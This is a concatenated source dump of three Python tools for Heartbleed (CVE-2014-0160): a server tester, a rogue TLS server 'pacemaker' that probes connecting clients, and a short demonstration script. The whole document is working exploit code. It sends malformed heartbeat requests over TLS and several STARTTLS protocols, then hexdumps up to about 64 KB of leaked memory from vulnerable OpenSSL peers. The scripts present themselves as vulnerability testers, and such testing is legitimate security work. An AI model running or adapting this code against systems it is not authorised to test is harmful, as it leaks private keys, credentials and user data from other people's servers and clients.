__FILENAME__ = heartbleed
#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the server
# Author: Peter Wu <peter@lekensteyn.nl>
# Licensed under the MIT license <http://opensource.org/licenses/MIT>.

# Python 2.6 compatibility
from __future__ import unicode_literals

import socket
import sys
import struct
import time
from argparse import ArgumentParser

# Hexdump etc
from pacemaker import hexdump, make_heartbeat, read_record, read_hb_response
from pacemaker import Failure, payload_len

parser = ArgumentParser(description='Test servers for Heartbleed (CVE-2014-0160)')
parser.add_argument('host', help='Hostname to connect to')
parser.add_argument('-6', '--ipv6', action='store_true',
        help='Enable IPv6 addresses (implied by IPv6 listen addr. such as ::)')
parser.add_argument('-p', '--port', type=int, default=None,
        help='TCP port to connect to (default depends on service)')
# Note: FTP is (Explicit FTPS). Use TLS for Implicit FTPS
parser.add_argument('-s', '--service', default='tls',
        choices=['tls', 'ftp', 'smtp', 'imap', 'pop3'],
        help='Target service type (default %(default)s)')
parser.add_argument('-t', '--timeout', type=int, default=3,
        help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
parser.add_argument('-x', '--count', type=int, default=1,
        help='Number of Heartbeats requests to be sent (default %(default)d)')
parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
        dest='payload_len',
        help='Requested payload length including 19 bytes heartbeat type, ' +
            'payload length and padding (default %(default)#x bytes)')

default_ports = {
    'tls': 443,
    'ftp': 21,
    'smtp': 25, # tcp port 587 is used for submission
    'imap': 143,
    'pop3': 110,
}

def make_clienthello(sslver='03 01'):
    # openssl ciphers -V 'HIGH:!MD5:!PSK:!DSS:!ECDSA:!aNULL:!SRP' |
    # awk '{gsub("0x","");print tolower($1)}' | tr ',\n' ' '
    ciphers = u'''
    c0 30 c0 28 c0 14 00 9f 00 6b 00 39 00 88 c0 32
    c0 2e c0 2a c0 26 c0 0f c0 05 00 9d 00 3d 00 35
    00 84 c0 12 00 16 c0 0d c0 03 00 0a c0 2f c0 27
    c0 13 00 9e 00 67 00 33 00 45 c0 31 c0 2d c0 29
    c0 25 c0 0e c0 04 00 9c 00 3c 00 2f 00 41
    '''
    ciphers_len = len(bytearray.fromhex(ciphers.replace('\n', '')))

    # Handshake type and length will be added later
    hs = sslver
    hs += 32 * ' 42'    # Random
    hs += ' 00'         # SID length
    hs += ' 00 {0:02x}'.format(ciphers_len) + ciphers
    hs += ' 01 00 '     # Compression methods (1); NULL compression
    # Extensions length
    hs += ' 00 05'      # Extensions length
    # Heartbeat extension
    hs += ' 00 0f'      # Heartbeat type
    hs += ' 00 01'      # Length
    hs += ' 01'         # mode (peer allowed to send requests)

    hs_data = bytearray.fromhex(hs.replace('\n', ''))
    # ClientHello (1), length 00 xx xx
    hs_data = struct.pack(b'>BBH', 1, 0, len(hs_data)) + hs_data

    # Content Type: Handshake (22)
    record_data = bytearray.fromhex(u'16 ' + sslver)
    record_data += struct.pack(b'>H', len(hs_data))
    record_data += hs_data
    return record_data

def skip_server_handshake(sock, timeout):
    end_time = time.time() + timeout
    hs_struct = struct.Struct(b'!BBH')
    for i in range(0, 5):
        record, error = read_record(sock, timeout)
        timeout = end_time - time.time()
        if not record:
            raise Failure('Unexpected server handshake! ' + str(error))

        content_type, sslver_num, fragment = record
        if content_type != 22:
            raise Failure('Expected handshake type, got ' + str(content_type))

        sslver = '{0:02x} {1:02x}'.format(sslver_num >> 8, sslver_num & 0xFF)

        off = 0
        # Records may consist of multiple handshake messages
        while off + hs_struct.size <= len(fragment):
            hs_type, len_high, len_low = hs_struct.unpack_from(fragment, off)
            if off + len_low > len(fragment):
                raise Failure('Illegal handshake length!')
            off += hs_struct.size + len_low

            # Server handshake is complete after ServerHelloDone
            if hs_type == 14:
                # Ready to check for vulnerability
                return sslver

    raise Failure('Too many handshake messages')

def handle_ssl(sock, args, sslver='03 01'):
    # ClientHello
    sock.sendall(make_clienthello(sslver))

    # Skip ServerHello, Certificate, ServerKeyExchange, ServerHelloDone
    sslver = skip_server_handshake(sock, args.timeout)

    # Are you alive? Heartbeat please!
    try:
        sock.sendall(make_heartbeat(sslver, args.payload_len))
    except socker.error as e:
        print('Unable to send heartbeat! ' + str(e))
        return False

    try:
        memory = read_hb_response(sock, args.timeout)
        if memory is not None and not memory:
            print('Possibly not vulnerable')
            return False
        elif memory:
            print('Server returned {0} ({0:#x}) bytes'.format(len(memory)))
            hexdump(memory)
    except socket.error as e:
        print('Unable to read heartbeat response! ' + str(e))
        return False

    # "Maybe" vulnerable
    return True

def test_server(args, prepare_func=None, family=socket.AF_INET):
    try:
        try:
            sock = socket.socket(family=family)
            sock.settimeout(args.timeout) # For writes, reads are already guarded
            sock.connect((args.host, args.port))
        except socket.error as e:
            print('Unable to connect to {0}:{1}: {2}'.format(args.host, args.port, e))
            return False

        remote_addr, remote_port = sock.getpeername()[:2]
        print('Connected to: {0}:{1}'.format(remote_addr, remote_port))

        if prepare_func is not None:
            prepare_func(sock)
            print('Pre-TLS stage completed, continuing with handshake')

        return handle_ssl(sock, args)
    except (Failure, socket.error) as e:
        print('Unable to check for vulnerability: ' + str(e))
        return False
    finally:
        if sock:
            sock.close()

class Linereader(object):
    def __init__(self, sock):
        self.buffer = bytearray()
        self.sock = sock

    def readline(self):
        if not b'\n' in self.buffer:
            self.buffer += self.sock.recv(4096)
        nlpos = self.buffer.index(b'\n')
        if nlpos >= 0:
            line = self.buffer[:nlpos+1]
            del self.buffer[:nlpos+1]
            return line.decode('ascii')
        return ''

class Services(object):
    @classmethod
    def get_prepare(cls, service):
        name = 'prepare_' + service
        if hasattr(cls, name):
            return getattr(cls, name)
        return None

    @staticmethod
    def readline_expect(reader, expected, what=None):
        line = reader.readline()
        if not line.upper().startswith(expected.upper()):
            if what is None:
                what = expected
            raise Failure('Expected ' + expected + ', got ' + line)
        return line

    @classmethod
    def prepare_ftp(cls, sock):
        reader = Linereader(sock)
        tls = False
        cls.readline_expect(reader, '220 ', 'FTP greeting')

        sock.sendall(b'FEAT\r\n')
        cls.readline_expect(reader, '211-', 'FTP features')
        for i in range(0, 64):
            line = reader.readline().upper()
            if line.startswith(' AUTH TLS'):
                tls = True
            if line.startswith('211'):
                break

        if not tls:
            raise Failure('AUTH TLS not supported')

        sock.sendall(b'AUTH TLS\r\n')
        cls.readline_expect(reader, '234 ', 'AUTH TLS ack')

    @classmethod
    def prepare_smtp(cls, sock):
        reader = Linereader(sock)
        tls = False

        # Server greeting
        cls.readline_expect(reader, '220 ', 'SMTP banner')

        sock.sendall(b'EHLO pacemaker\r\n')
        # Assume no more than 16 extensions
        for i in range(0, 16):
            line = cls.readline_expect(reader, '250', 'extension')
            if line[4:].upper().startswith('STARTTLS'):
                tls = True
            if line[3] == ' ':
                break

        if not tls:
            raise Failure('STARTTLS not supported')

        sock.sendall(b'STARTTLS\r\n')
        cls.readline_expect(reader, '220 ', 'STARTTLS acknowledgement')

    @classmethod
    def prepare_imap(cls, sock):
        reader = Linereader(sock)
        # actually, the greeting contains PREAUTH or OK
        cls.readline_expect(reader, '* ', 'IMAP banner')

        sock.sendall(b'a001 STARTTLS\r\n')
        cls.readline_expect(reader, 'a001 OK', 'STARTTLS acknowledgement')

    @classmethod
    def prepare_pop3(cls, sock):
        reader = Linereader(sock)
        cls.readline_expect(reader, '+OK')
        sock.sendall(b'STLS\r\n')
        cls.readline_expect(reader, '+OK')

def main(args):
    family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
    prep_func = Services.get_prepare(args.service)

    # OpenSSL expects a client key exchange after its ServerHello.  After the
    # first heartbeat, it will reset the connection. That's why we cannot just
    # repeatedly send heartbeats as the client does. For that, we need to
    # complete the handshake, but that requires a different implementation
    # approach. For now just keep re-connecting, it will flood server logs with
    # handshake failures though.
    for i in range(0, args.count):
        if not test_server(args, prepare_func=prep_func, family=family):
            break

if __name__ == '__main__':
    args = parser.parse_args()
    if args.port is None:
        args.port = default_ports[args.service]
    try:
        main(args)
    except KeyboardInterrupt:
        pass

########NEW FILE########
__FILENAME__ = pacemaker
#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the client
# Author: Peter Wu <peter@lekensteyn.nl>
# Licensed under the MIT license <http://opensource.org/licenses/MIT>.

# Python 2.6 compatibility
from __future__ import unicode_literals

try:
    import socketserver
except:
    import SocketServer as socketserver
import socket
import sys
import struct
import select, time
from argparse import ArgumentParser, ArgumentTypeError

# OpenSSL 1.0.1f buffer size is 4096 (DEFAULT_BUFFER_SIZE), data is flushed in
# buffer_write iff the size of the TLSPlaintext ("fragment") exceeds that
# buffer. So, to reliably get a heartbeat back, the payload length must be at
# least 4097 ("over 4096") - 5 (content type, TLS version, record length) - 3
# (HB type, payload length) - 16 (added padding). Also note that the maximum
# TLSPlaintext length is 0x4000 (SSL3_RT_MAX_PLAIN_LENGTH, enforced via
# max_send_fragment in ssl3_write_bytes).
#
# The returned heartbeat fragment has length 3 + payload length + 16 (type,
# payload length, payload, padding).
MAX_PLAIN_LENGTH = 0x4000

def payload_len(string):
    # Minimum OpenSSL buffer fill size for the fragment (excl. record "header")
    pl_min = 4097 - 5
    # Drop type (1) + payload length (2) + padding (16) = 19
    pl_max = 0xffed
    payload_len = int(string, 0) # Accept decimal (e.g. 18) and hex (e.g. 0x12)
    if payload_len > pl_max:
        raise ArgumentTypeError('Payload length must be at most {0} ({0:#x})'
            .format(pl_max))
    if payload_len < pl_min:
        raise ArgumentTypeError('Payload length must be at least {0} ({0:#x})'
            .format(pl_min))

    # Size of total response incl. hb type, payload len and padding
    response_len = 3 + payload_len + 16
    # Each response block must be at be the buffer size
    if 0 < response_len % MAX_PLAIN_LENGTH < pl_min:
        safe_payload_len = MAX_PLAIN_LENGTH * (response_len // MAX_PLAIN_LENGTH)
        safe_payload_len += pl_min - 3 - 16
        print(('Warning: payload length {0} ({0:#x}) will cause delays, ' +
            'try at least {1} ({1:#x})').format(payload_len, safe_payload_len))

    return payload_len

parser = ArgumentParser(description='Test clients for Heartbleed (CVE-2014-0160)')
parser.add_argument('-6', '--ipv6', action='store_true',
        help='Enable IPv6 addresses (implied by IPv6 listen addr. such as ::)')
parser.add_argument('-l', '--listen', default='',
        help='Host to listen on (default "%(default)s")')
parser.add_argument('-p', '--port', type=int, default=4433,
        help='TCP port to listen on (default %(default)d)')
# Note: FTP is (Explicit FTPS). Use TLS for Implicit FTPS
parser.add_argument('-c', '--client', default='tls',
        choices=['tls', 'mysql', 'ftp', 'smtp', 'imap', 'pop3'],
        help='Target client type (default %(default)s)')
parser.add_argument('-t', '--timeout', type=int, default=3,
        help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
parser.add_argument('--skip-server', default=False, action='store_true',
        help='Skip ServerHello, immediately write Heartbeat request')
parser.add_argument('-x', '--count', type=int, default=1,
        help='Number of Heartbeats requests to be sent (default %(default)d)')
parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
        dest='payload_len',
        help='Requested payload length including 19 bytes heartbeat type, ' +
            'payload length and padding (default %(default)#x bytes)')

def make_hello(sslver, cipher):
    # Record
    data = '16 ' + sslver
    data += ' 00 31' # Record ength
    # Handshake
    data += ' 02 00'
    data += ' 00 2d' # Handshake length
    data += ' ' + sslver
    data += '''
    52 34 c6 6d 86 8d e8 40 97 da
    ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
    95 8c 33 42 3f d5 00
    '''
    data += ' '.join('{0:02x}'.format(c) for c in cipher)
    data += ' 00' # No compression
    data += ' 00 05' # Extensions length
    # Heartbeat extension
    data += ' 00 0f' # Heartbeat type
    data += ' 00 01' # Length
    data += ' 01'    # mode
    return bytearray.fromhex(data.replace('\n', ''))

def make_heartbeat(sslver, payload_len=0xffed):
    data = '18 ' + sslver
    data += ' 00 03'    # Length
    data += ' 01'       # Type: Request
    # OpenSSL responds with records of length 0x4000. It starts with 3 bytes
    # (length, response type) and ends with a 16 byte padding. If the payload is
    # too small, OpenSSL buffers it and this will cause issues with repeated
    # heartbeat requests. Therefore request a payload that fits exactly in four
    # records (0x4000 * 4 - 3 - 16 = 0xffed).
    data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
    return bytearray.fromhex(data.replace('\n', ''))

def hexdump(data):
    allzeroes = b'\0' * 16
    zerolines = 0

    for i in range(0, len(data), 16):
        line = data[i:i+16]
        if line == allzeroes[:len(line)]:
            zerolines += 1
            if zerolines == 2:
                print("*")
            if zerolines >= 2:
                continue

        print("{0:04x}: {1:47}  {2}".format(i,
            ' '.join('{0:02x}'.format(c) for c in line),
            ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))

class Failure(Exception):
    pass

class RecordParser(object):
    record_s = struct.Struct(b'!BHH')
    def __init__(self):
        self.buffer = bytearray()
        self.buffer_len = 0
        self.record_hdr = None

    def feed(self, data):
        self.buffer += data
        self.buffer_len += len(data)

    def get_header(self):
        if self.record_hdr is None and self.buffer_len >= self.record_s.size:
            self.record_hdr = self.record_s.unpack_from(bytes(self.buffer))
        return self.record_hdr

    def bytes_needed(self):
        '''Zero or lower indicates that a fragment is available'''
        expected_len = self.record_s.size
        if self.get_header():
            expected_len += self.record_hdr[2]
        return expected_len - self.buffer_len

    def get_record(self, partial=False):
        if not self.get_header():
            return None

        record_type, sslver, fragment_len = self.record_hdr
        record_len = self.record_s.size + fragment_len

        if not partial and self.buffer_len < record_len:
            return None

        fragment = self.buffer[self.record_s.size:record_len]

        del self.buffer[:record_len]
        self.buffer_len -= record_len
        self.record_hdr = None

        return record_type, sslver, bytes(fragment)

def read_record(sock, timeout, partial=False):
    rparser = RecordParser()
    end_time = time.time() + timeout
    error = None

    bytes_to_read = rparser.bytes_needed()
    while bytes_to_read > 0 and timeout > 0:
        rl, _, _ = select.select([sock], [], [], timeout)

        if not rl:
            error = socket.timeout('Timeout while waiting for bytes')
            break

        try:
            rparser.feed(rl[0].recv(bytes_to_read))
        except socket.error as e:
            error = e
            break # Connection reset?

        bytes_to_read = rparser.bytes_needed()
        timeout = end_time - time.time()

    return rparser.get_record(partial=partial), error

def read_hb_response(sock, timeout):
    end_time = time.time() + timeout
    memory = bytearray()
    hb_len = 1      # Will be initialized after first heartbeat
    read_error = None
    alert = None

    while len(memory) < hb_len and timeout > 0:
        record, read_error = read_record(sock, timeout, partial=True)
        if not record:
            break

        record_type, _, fragment = record
        if record_type == 24:
            if not memory: # First Heartbeat
                # Check for enough room for type + len
                if len(fragment) < 3:
                    if read_error: # Ignore error due to partial read
                        break
                    raise Failure('Response too small')
                # Sanity check, should not happen with OpenSSL
                if fragment[0:1] != b'\2':
                    raise Failure('Expected Heartbeat in first response')

                hb_len, = struct.unpack_from(b'!H', fragment, 1)
                memory += fragment[3:]
            else: # Heartbeat continuation
                memory += fragment
        elif record_type == 21 and len(fragment) == 2: # Alert
            alert = fragment
            break
        else:
            # Cannot tell whether vulnerable or not!
            raise Failure('Unexpected record type {0}'.format(record_type))

        timeout = end_time - time.time()

    # Drop heartbeat padding that is included in buffer
    if len(memory) - 16 == hb_len:
        del memory[hb_len:]

    # Check for Alert (sent by NSS)
    if alert:
        lvl, desc = alert[0:1], ord(alert[1:2])
        lvl = 'Warning' if lvl == 1 else 'Fatal'
        print('Got Alert, level={0}, description={1}'.format(lvl, desc))
        if not memory:
            print('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
            return None

    # Do not print error if we have memory, server could be crashed, etc.
    if read_error and not memory:
        print('Did not receive heartbeat response! ' + str(read_error))

    return memory

class RequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.args = self.server.args
        self.sslver = '03 01' # default to TLSv1.0
        remote_addr, remote_port = self.request.getpeername()[:2]
        print("Connection from: {0}:{1}".format(remote_addr, remote_port))

        try:
            # Set timeout to prevent hang on clients that send nothing
            self.request.settimeout(2)
            prep_meth = 'prepare_' + self.args.client
            if hasattr(self, prep_meth):
                getattr(self, prep_meth)(self.request)
                print('Pre-TLS stage completed, continuing with handshake')

            if not self.args.skip_server:
                self.do_serverhello()

            for i in range(0, self.args.count):
                try:
                    if not self.do_evil():
                        break
                except socket.error as e:
                    if i == 0: # First heartbeat?
                        print('Unable to send first heartbeat! ' + str(e))
                    else:
                        print('Unable to send more heartbeats, ' + str(e))
                    break
        except (Failure, socket.error, socket.timeout) as e:
            print('Unable to check for vulnerability: ' + str(e))
        except KeyboardInterrupt:
            # Don't just abort this client, stop the server too
            print('Shutting down...')
            self.server.kill()

        print('')

    def do_serverhello(self):
        # Read TLS record header
        content_type, ver, rec_len = self.recv_s(b'>BHH', 'TLS record')
        # Session-ID length (1 byte) starts at offset 38
        self.expect(rec_len >= 39, 'Illegal handshake packet')
        if content_type == 0x80: # SSLv2 (assume length < 256)
            raise Failure('SSL 2.0 clients cannot be tested')
        else:
            self.expect(content_type == 22, 'Expected Handshake type')

        # Read handshake
        hnd = self.request.recv(rec_len)
        self.expect(len(hnd) == rec_len, 'Unable to read handshake')
        hnd_type, len_high, len_low, ver = struct.unpack(b'>BBHH', hnd[:6])
        self.expect(hnd_type == 1, 'Expected Client Hello')
        # hnd[6:6+32] is Random
        off = 6 + 32
        sid_len, = struct.unpack(b'B', hnd[off:off+1])
        off += 1 + sid_len # Skip length and SID
        # Enough room for ciphers?
        self.expect(rec_len - off >= 4, 'Illegal handshake packet (2)')
        ciphers_len = struct.unpack(b'<H', hnd[off:off+2])
        off += 2
        # The first cipher is fine...
        cipher = bytearray(hnd[off:off+2])

        self.sslver = '{0:02x} {1:02x}'.format(ver >> 8, ver & 0xFF)

        # (1) Handshake: ServerHello
        self.request.sendall(make_hello(self.sslver, cipher))

        # (skip Certificate, etc.)

    def do_evil(self):
        '''Returns True if memory *may* be acquired'''
        # (2) HeartbeatRequest
        self.request.sendall(make_heartbeat(self.sslver, self.args.payload_len))

        # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
        memory = read_hb_response(self.request, self.args.timeout)

        # If memory is None, then it is not vulnerable for sure. Otherwise, if
        # empty, then it *may* be invulnerable
        if memory is not None and not memory:
            print("Possibly not vulnerable")
            return False
        elif memory:
            print('Client returned {0} ({0:#x}) bytes'.format(len(memory)))
            hexdump(memory)

        return True

    def expect(self, cond, what):
        if not cond:
            raise Failure(what)


    def prepare_mysql(self, sock):
        # This was taken from a MariaDB client. For reference, see
        # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake
        greeting = u'''
        56 00 00 00 0a 35 2e 35  2e 33 36 2d 4d 61 72 69
        61 44 42 2d 6c 6f 67 00  04 00 00 00 3d 3b 4e 57
        4c 54 44 35 00 ff ff 21  02 00 0f e0 15 00 00 00
        00 00 00 00 00 00 00 7c  36 33 3f 23 2e 5e 6d 2d
        34 5c 54 00 6d 79 73 71  6c 5f 6e 61 74 69 76 65
        5f 70 61 73 73 77 6f 72  64 00
        '''
        sock.sendall(bytearray.fromhex(greeting.replace('\n', '')))
        print("Server Greeting sent.")

        len_low, len_high, seqid, caps = self.recv_s(b'<BHBH', 'MySQL handshake')
        packet_len = (len_high << 8) | len_low
        self.expect(packet_len == 32, 'Expected SSLRequest length == 32')
        self.expect((caps & 0x800), 'Missing Client SSL support')

        print("Skipping {0} packet bytes...".format(packet_len))
        # Skip remainder (minus 2 for caps) to prepare for SSL handshake
        sock.recv(packet_len - 2)

    def prepare_ftp(self, sock):
        sock.sendall('220 pacemaker test\r\n'.encode('ascii'))
        data = sock.recv(16).decode('ascii').strip()
        self.expect(data in ('AUTH SSL', 'AUTH TLS'), \
            'Unexpected response: ' + data)
        sock.sendall(bytearray('234 ' + data + '\r\n', 'ascii'))

    def prepare_pop3(self, sock):
        self.do_conversation('+OK pacemaker ready\r\n', [
            ('CAPA', '+OK\r\nSTLS\r\n.\r\n'),
            ('STLS', '+OK\r\n')
        ])

    def prepare_smtp(self, sock):
        self.do_conversation('220 pacemaker test\r\n', [
            ('EHLO ',    '250-example.com Hi!\r\n250 STARTTLS\r\n'),
            ('STARTTLS', '220 Go ahead\r\n')
        ])

    def prepare_imap(self, sock):
        caps = 'CAPABILITY IMAP4rev1 STARTTLS'
        talk = [
            ('CAPABILITY', '* ' + caps + '\r\n'),
            ('STARTTLS', '')
        ]
        sock.sendall(('* OK [' + caps + '] ready\r\n').encode('ascii'))

        for exp, resp in talk:
            data = sock.recv(256).decode('ascii').upper()
            self.expect(' ' in data, 'IMAP protocol violation, got ' + data)
            tag, data = data.split(' ', 2)
            self.expect(data[:len(exp)] == exp, \
                'Expected ' + exp + ', got ' + data)
            resp += tag + ' OK\r\n'
            sock.sendall(resp.encode('ascii'))

    def do_conversation(self, greeting, talk):
        '''Helper to handle simple request-response protocols.'''
        self.request.sendall(greeting.encode('ascii'))

        for exp, resp in talk:
            data = self.request.recv(256).decode('ascii').upper()
            self.expect(data[:len(exp)] == exp, \
                'Expected ' + exp + ', got ' + data)
            self.request.sendall(resp.encode('ascii'))

    def recv_s(self, struct_def, what):
        s = struct.Struct(struct_def)
        data = self.request.recv(s.size)
        msg = '{0}: received only {1}/{2} bytes'.format(what, len(data), s.size)
        self.expect(len(data) == s.size, msg)
        return s.unpack(data)

class PacemakerServer(socketserver.TCPServer):
    def __init__(self, args):
        server_address = (args.listen, args.port)
        self.allow_reuse_address = True
        if args.ipv6 or ':' in args.listen:
            self.address_family = socket.AF_INET6
        socketserver.TCPServer.__init__(self, server_address, RequestHandler)
        self.args = args

    def serve_forever(self):
        self.stopped = False
        while not self.stopped:
            self.handle_request()

    def kill(self):
        self.stopped = True

def serve(args):
    print('Listening on {0}:{1} for {2} clients'
        .format(args.listen, args.port, args.client))
    server = PacemakerServer(args)
    server.serve_forever()

if __name__ == '__main__':
    args = parser.parse_args()
    try:
        serve(args)
    except KeyboardInterrupt:
        pass

########NEW FILE########
__FILENAME__ = ssltest
#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == '__main__':
    main()

########NEW FILE########
